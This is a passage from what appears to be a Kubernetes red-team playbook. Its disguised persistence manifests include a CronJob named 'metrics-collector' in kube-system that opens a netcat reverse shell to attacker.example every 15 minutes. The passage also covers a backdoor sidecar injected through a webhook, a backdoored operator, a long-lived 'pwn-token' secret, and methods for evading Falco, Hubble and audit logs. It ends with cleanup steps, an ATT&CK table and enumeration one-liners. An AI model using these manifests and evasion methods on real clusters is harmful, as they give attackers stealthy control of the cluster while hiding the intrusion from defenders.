# Each pod is privileged + hostNetwork + hostPID + mounts / → full node compromise.
```

### 13.2 CronJob (periodic reverse shell)

```yaml
# persistence-cron.yaml
apiVersion: batch/v1
kind: CronJob
metadata:
  name: metrics-collector
  namespace: kube-system
spec:
  schedule: "*/15 * * * *"
  concurrencyPolicy: Forbid
  jobTemplate:
    spec:
      template:
        spec:
          restartPolicy: OnFailure
          containers:
          - name: collector
            image: busybox
            command:
            - /bin/sh
            - -c
            - 'nc -e /bin/sh attacker.example 4444 || curl -s http://attacker.example/ping'
```

```bash
kubectl apply -f persistence-cron.yaml
# Looks like a normal metrics collector; calls back every 15 minutes.
```

### 13.3 MutatingWebhook sidecar injection

```yaml
# persistence-webhook.yaml
# A MutatingWebhook that injects a backdoor sidecar into every new pod.
apiVersion: admissionregistration.k8s.io/v1
kind: MutatingWebhookConfiguration
metadata: { name: pod-protector }
webhooks:
- name: pod-protector.protector.svc
  clientConfig:
    service: { name: pod-protector, namespace: kube-system, path: /mutate }
  rules:
  - operations: [CREATE]
    apiGroups: [""]
    apiVersions: ["v1"]
    resources: ["pods"]
  failurePolicy: Ignore
  sideEffects: None
  admissionReviewVersions: ["v1"]
```

```bash
# Deploy the webhook backend (a small Go service that adds a sidecar)
kubectl apply -f persistence-webhook.yaml
# Every new pod now gets the sidecar — persistence across reinstalls of the original app.
```

### 13.4 Backdoored operator

```bash
# Clone an existing operator, add a backdoor, redeploy
git clone https://github.com/<some-operator>/<repo>
cd <repo>
# Add a reconcile loop that creates a backdoor pod on every namespace
# ...
make deploy
# Looks like a normal operator; backdoors the cluster.
```

### 13.5 Token persistence

```bash
# Create a long-lived SA token (1.23 and earlier — still works on 1.24+ via TokenRequest)
kubectl apply -f - <<'EOF'
apiVersion: v1
kind: Secret
metadata:
  name: pwn-token
  annotations:
    kubernetes.io/service-account.name: <privileged-sa>
type: kubernetes.io/service-account-token
EOF
kubectl get secret pwn-token -o jsonpath='{.data.token}' | base64 -d
# This token persists in the cluster until the secret is deleted.
```

---

## 14. Detection Evasion (audit log spam, kube-bench evasion)

### 14.1 Audit logging — what gets logged

```bash
# Default audit policy logs at Metadata level:
#   - All Secret/ConfigMap access
#   - All RBAC changes
#   - All pods/exec, pods/attach, pods/portforward
#   - All authentication events
# Audit log path: /var/log/kubernetes/audit/audit.log on the API server.

# What this means for the attacker:
#   - Avoid get/list secrets if you can use a different path (etcd direct, exec into a pod that already has them)
#   - Avoid pods/exec — use logs/exec via a different route, or just dump the SA token
#   - Avoid RBAC changes if you can use existing privileged SAs
```

### 14.2 Falco evasion

```bash
# Falco default rules trigger on:
#   - Shell spawned in a container
#   - nsenter or setns
#   - Write under /etc, /root, /bin
#   - Outbound connection to unusual IP
#   - kubectl binary inside a container

# Evasion strategies:
# 1. Use static binaries, not /bin/sh
# 2. Avoid /etc, /root, /bin writes — use /tmp, /dev/shm
# 3. Use existing tools inside the image, not downloaded ones
# 4. Reuse the SA token outside the cluster instead of operating inside
# 5. Use capabilities that don't trigger Falco (e.g., CAP_NET_BIND_SERVICE for port binding)
# 6. Time your actions to coincide with normal workload activity
```

### 14.3 Hubble / Cilium evasion

```bash
# Hubble samples flows; you can fly under the radar by:
# 1. Low-bandwidth beaconing (CronJob every 15 min, not constant stream)
# 2. Use allowed DNS paths (UDP/53 to kube-dns)
# 3. Use allowed cloud paths (metadata service)
# 4. Stay within namespace (no cross-namespace traffic that violates policy)
```

### 14.4 Audit log bomb (stratus-red-team)

```bash
# Denial-of-service via audit log flooding
stratus detonate k8s.audit-log-bomb
# Generates massive audit log volume to mask real attacker activity.

# Other stratus K8s techniques
stratus list | grep '^k8s\.'
stratus detonate k8s.<technique-name>
```

### 14.5 Cleanup after engagement

```bash
# Delete the persistence DaemonSets / CronJobs
kubectl delete daemonset kube-cache -n kube-system
kubectl delete cronjob metrics-collector -n kube-system

# Delete forged RBAC bindings
kubectl delete clusterrolebinding pwn-admin
kubectl delete rolebinding pwn-sa -n kube-system

# Delete the backdoor pod
kubectl delete pod pwn

# Delete the pwn token
kubectl delete secret pwn-token

# Rotate compromised SAs (1.24+ projected tokens rotate automatically; legacy long-lived tokens need manual rotation)
kubectl delete secret <sa>-token-<hash>   # forces regeneration

# Rotate cloud IAM
# AWS: revoke active STS sessions, rotate the role's trust policy
# GCP: revoke the SA key
# Azure: rotate the Managed Identity
```

---

## Appendix A: Quick Reference — MITRE ATT&CK for Containers Mapping

| Tactic | Technique | K8s example |
|--------|-----------|-------------|
| Initial Access | T1611 Escape to Host | privileged pod + nsenter |
| Initial Access | T1610 Deploy Container | kubectl run malicious image |
| Execution | T1615.001 Container Shell | kubectl exec |
| Persistence | T1611 Deploy Container (DaemonSet) | malicious DaemonSet |
| Privilege Escalation | T1611 Privileged Container | privileged: true |
| Defense Evasion | T1614 Clear Container History | delete audit logs |
| Credential Access | T1552 Service Account Token | steal mounted SA token |
| Discovery | T1613 Container and Resource Discovery | kubectl get all -A |
| Lateral Movement | T1610 Deploy Container in another namespace | forge SA token, exec in another ns |
| Collection | T1602 Data from Config Repository | dump etcd |
| Impact | T1611 Destroy Resource | kubectl delete ns |

---

## Appendix B: Useful kubectl One-Liners

```bash
# All resources in all namespaces
kubectl api-resources --verbs=list --namespaced -o name | xargs -n1 kubectl get -A

# All secrets (if you have permission)
kubectl get secrets -A -o jsonpath='{range .items[*]}{.metadata.namespace}{"\t"}{.metadata.name}{"\n"}{end}'

# All pods with privileged containers
kubectl get pods -A -o json | jq -r '.items[] | select(.spec.containers[].securityContext.privileged==true) | "\(.metadata.namespace)/\(.metadata.name)"'

# All pods with hostPath
kubectl get pods -A -o json | jq -r '.items[] | select(.spec.volumes[]?.hostPath) | "\(.metadata.namespace)/\(.metadata.name)"'

# All pods with hostPID / hostNetwork
kubectl get pods -A -o json | jq -r '.items[] | select(.spec.hostPID or .spec.hostNetwork) | "\(.metadata.namespace)/\(.metadata.name)"'

# All pods mounting the docker.sock / containerd.sock
kubectl get pods -A -o json | jq -r '.items[] | select(.spec.volumes[]?.hostPath.path | test("docker.sock|containerd.sock")) | "\(.metadata.namespace)/\(.metadata.name)"'

# All serviceaccounts and their bindings
kubectl get clusterrolebinding,rolebinding -A -o json | jq -r '.items[] | .subjects[]? | select(.kind=="ServiceAccount") | "\(.namespace)/\(.name)"' | sort -u

# All namespaces and their PSA mode
kubectl get ns -o jsonpath='{range .items[*]}{.metadata.name}{"\t"}{.metadata.annotations.kubernetes\.io\/psa}{"\n"}{end}'

# All CRDs
kubectl get crd -o name

# All webhooks
kubectl get mutatingwebhookconfigurations,validatingwebhookconfigurations
```
